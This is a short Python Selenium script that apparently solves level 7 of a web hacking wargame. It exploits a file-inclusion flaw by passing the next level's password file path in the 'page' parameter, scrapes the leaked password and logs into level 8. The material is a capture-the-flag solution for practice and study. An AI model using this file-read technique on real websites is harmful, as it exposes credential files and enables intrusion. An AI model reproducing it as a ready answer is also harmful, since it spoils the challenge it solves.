from common import *

def solve(driver, _ = None):
    driver.get(build_url(level=7, end_arguments="/index.php?page="+build_webpass_path(8)))
    
    text = driver.find_element(By.XPATH, '//*[@id="content"]').text
    password = text[text.rfind('\n')+1:]
    
    driver.get(build_url(password = password, level=8))
    return password